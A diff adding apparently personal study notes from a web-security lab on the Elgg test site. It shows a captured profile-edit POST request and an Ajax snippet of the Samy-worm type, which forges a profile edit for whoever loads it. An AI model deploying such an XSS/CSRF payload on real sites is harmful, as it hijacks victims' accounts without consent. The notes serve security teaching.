@@ -424,3 +424,54 @@ SSL does not prevent CSRF because encryption is done by browser after the reques
 - CSRF Attack
 - Launch the CSRF attacks on GET and POST services
 - Fundamental causes and countermeasures
+
+### HTTP Request for Editing Profile (ELGG)
+
+```
+http://www.csrflabelgg.com/action/profile/edit
+
+POST /action/profile/edit HTTP/1.1
+Host: www.csrflabelgg.com
+User-Agent: ...
+Accept: ....
+Accept-Language: ...
+Referer: www.csrflabellgg.com/profile/samy/edit
+Cookie: Elgg-mpasspvn1q67od11k19rkklema4
+Content-Type: ...
+Content-Length: ...
+__elgg_token=1cc8v5c...&__elgg_ts=1489203659
+&name=Sammy
+&description=SAMMY+is+my+friend
+&accesslevel%5Bdescrption%5D=2
+...
+&guid=42
+
+```
+
+### Ajax Code: Send POST Request
+
+```js
+var name = "&name="+elgg.session.user.name;
+var guid = "&guid="+elgg.session.user.guid;
+
+//access tiesand and security token
+//...code omitted...
+
+//set the content and access level for the description firld
+
+var desc="&description=SAMY+is+my+HERO";
+desc+= "&accesslevel%fBdescription%5d=2";
+
+//send the the url
+var sendurl="http://www.xsslabelgg.com/action/profile/edit";
+
+if(elgg.session.user.guid!=50){
+  var Ajax=new XMLHttpRequest();
+  Ajax.open("POST",sendurl,true);
+  Ajax.setRequestHeader("Host","www.xsslabelgg.com");
+  Ajax.setRequestHeader("Content-type","application/x-www-form-urlencoded");
+  Ajax.send(token+ts+name+desc+guid);
+}
+```
+
+
